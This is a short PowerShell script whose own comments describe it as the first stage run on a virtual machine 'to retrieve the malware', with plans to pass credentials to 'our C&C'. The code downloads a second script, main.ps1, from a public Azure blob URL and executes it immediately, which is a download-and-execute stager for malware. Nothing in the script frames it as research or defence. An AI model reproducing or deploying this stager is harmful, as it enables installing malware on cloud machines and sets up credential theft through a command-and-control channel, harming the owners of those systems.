# this script is run first on the vm, to retrieve the malware.
# for now the call to this script is blocking... later we can some credentials
# to our C&C , and it can run runScriptOnVM so we dont care about blocking.
Param(
  [string]$StorageAccountName
)

$url = "https://runonvm.blob.core.windows.net/public/main.ps1" #later - change to our private place

#$appConfigUrl = "https://runonvm.blob.core.windows.net/public/App.config" #later - change to our private place
#Invoke-WebRequest -Uri $appConfigUrl -OutFile "c:\" #todo: need to make sure the VM has a C:\ disk

$file = "main.ps1"

Invoke-WebRequest -Uri $url -OutFile $file
.\main.ps1 -StorageAccountName $StorageAccountName

#.\main.ps1 -StorageAccountName $StorageAccountName 2>&1 | Out-File "log.txt"